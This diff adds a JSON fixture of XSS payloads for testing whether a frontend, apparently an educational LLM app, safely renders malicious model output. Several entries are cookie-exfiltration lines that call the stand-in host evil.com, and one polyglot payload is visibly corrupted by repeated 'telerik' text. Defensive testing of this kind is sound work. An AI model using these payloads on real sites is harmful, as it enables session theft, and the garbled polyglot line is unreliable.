@@ -1,0 +1,179 @@
+{
+  "_description": "XSS payload dataset for OWASP LLM02 (Insecure Output Handling) testing. Each payload simulates malicious content that an LLM might produce — either through hallucination or successful prompt injection. The frontend must render all of these harmlessly.",
+  "payloads": [
+    {
+      "id": "script_basic",
+      "category": "script_injection",
+      "payload": "<script>alert('XSS')</script>",
+      "description": "Classic inline script tag"
+    },
+    {
+      "id": "script_encoded",
+      "category": "script_injection",
+      "payload": "<script>document.location='http://evil.com/?c='+document.cookie</script>",
+      "description": "Cookie exfiltration via script tag"
+    },
+    {
+      "id": "script_multiline",
+      "category": "script_injection",
+      "payload": "<script>\nvar x = new XMLHttpRequest();\nx.open('GET','http://evil.com/?c='+document.cookie);\nx.send();\n</script>",
+      "description": "Multiline script with XMLHttpRequest"
+    },
+    {
+      "id": "img_onerror",
+      "category": "event_handler",
+      "payload": "<img src=x onerror=alert('XSS')>",
+      "description": "Image tag with onerror event handler"
+    },
+    {
+      "id": "img_onerror_encoded",
+      "category": "event_handler",
+      "payload": "<img src=\"x\" onerror=\"fetch('http://evil.com/?c='+document.cookie)\">",
+      "description": "Image onerror with fetch exfiltration"
+    },
+    {
+      "id": "svg_onload",
+      "category": "event_handler",
+      "payload": "<svg onload=alert('XSS')>",
+      "description": "SVG tag with onload event handler"
+    },
+    {
+      "id": "body_onload",
+      "category": "event_handler",
+      "payload": "<body onload=alert('XSS')>",
+      "description": "Body tag with onload handler"
+    },
+    {
+      "id": "div_onmouseover",
+      "category": "event_handler",
+      "payload": "<div onmouseover=\"alert('XSS')\">Hover me</div>",
+      "description": "Div with onmouseover event"
+    },
+    {
+      "id": "input_onfocus",
+      "category": "event_handler",
+      "payload": "<input onfocus=alert('XSS') autofocus>",
+      "description": "Input with autofocus triggering onfocus"
+    },
+    {
+      "id": "details_ontoggle",
+      "category": "event_handler",
+      "payload": "<details open ontoggle=alert('XSS')><summary>Click</summary></details>",
+      "description": "Details element with ontoggle"
+    },
+    {
+      "id": "markdown_js_link",
+      "category": "markdown_injection",
+      "payload": "[Click here for resources](javascript:alert('XSS'))",
+      "description": "Markdown link with javascript: protocol"
+    },
+    {
+      "id": "markdown_js_link_case",
+      "category": "markdown_injection",
+      "payload": "[Important reading](JaVaScRiPt:alert('XSS'))",
+      "description": "Markdown link with mixed-case javascript: protocol"
+    },
+    {
+      "id": "markdown_js_link_encoded",
+      "category": "markdown_injection",
+      "payload": "[Download syllabus](javascript&#58;alert('XSS'))",
+      "description": "Markdown link with HTML-entity-encoded javascript:"
+    },
+    {
+      "id": "markdown_data_uri",
+      "category": "markdown_injection",
+      "payload": "[View notes](data:text/html,<script>alert('XSS')</script>)",
+      "description": "Markdown link with data: URI containing script"
+    },
+    {
+      "id": "markdown_img_tag",
+      "category": "markdown_injection",
+      "payload": "![alt](x\" onerror=\"alert('XSS'))",
+      "description": "Markdown image with attribute injection"
+    },
+    {
+      "id": "iframe_injection",
+      "category": "html_element",
+      "payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>",
+      "description": "Iframe with javascript: src"
+    },
+    {
+      "id": "iframe_srcdoc",
+      "category": "html_element",
+      "payload": "<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
+      "description": "Iframe with srcdoc containing script"
+    },
+    {
+      "id": "object_data",
+      "category": "html_element",
+      "payload": "<object data=\"javascript:alert('XSS')\"></object>",
+      "description": "Object tag with javascript: data"
+    },
+    {
+      "id": "embed_src",
+      "category": "html_element",
+      "payload": "<embed src=\"javascript:alert('XSS')\">",
+      "description": "Embed tag with javascript: src"
+    },
+    {
+      "id": "form_action",
+      "category": "html_element",
+      "payload": "<form action=\"javascript:alert('XSS')\"><input type=submit></form>",
+      "description": "Form with javascript: action"
+    },
+    {
+      "id": "style_expression",
+      "category": "css_injection",
+      "payload": "<div style=\"background:url('javascript:alert(1)');\">styled</div>",
+      "description": "CSS expression in style attribute"
+    },
+    {
+      "id": "style_tag",
+      "category": "css_injection",
+      "payload": "<style>body{background:url('http://evil.com/track')}</style>",
+      "description": "Style tag with external URL tracking"
+    },
+    {
+      "id": "meta_refresh",
+      "category": "meta_injection",
+      "payload": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
+      "description": "Meta refresh redirect to javascript:"
+    },
+    {
+      "id": "base_href",
+      "category": "meta_injection",
+      "payload": "<base href=\"http://evil.com/\">",
+      "description": "Base tag hijacking relative URLs"
+    },
+    {
+      "id": "anchor_js_href",
+      "category": "html_element",
+      "payload": "<a href=\"javascript:alert('XSS')\">Click for course materials</a>",
+      "description": "Anchor tag with javascript: href"
+    },
+    {
+      "id": "polyglot_xss",
+      "category": "polyglot",
+      "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik22telerik33telerik44telerik55telerik66telerik77telerik88telerik99%telerik0telerik1A%0telerik0telerik1telerik0telerik22/telerik0-->*/</stYle/</telerik0titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+      "description": "Polyglot XSS payload covering multiple contexts"
+    },
+    {
+      "id": "mixed_content_1",
+      "category": "mixed_educational",
+      "payload": "Students should learn about <script>alert('variables')</script> and data types in Python.",
+      "description": "Script tag mixed into legitimate educational text"
+    },
+    {
+      "id": "mixed_content_2",
+      "category": "mixed_educational",
+      "payload": "## Learning Objectives\n\n1. Understand <img src=x onerror=alert(1)> HTML injection vectors\n2. Practice secure coding",
+      "description": "Markdown heading with embedded HTML injection"
+    },
+    {
+      "id": "mixed_content_3",
+      "category": "mixed_educational",
+      "payload": "Review materials at [course website](javascript:void(document.location='http://evil.com/?'+document.cookie)) for next class",
+      "description": "Markdown link with cookie-stealing javascript:"
+    }
+  ]
+}
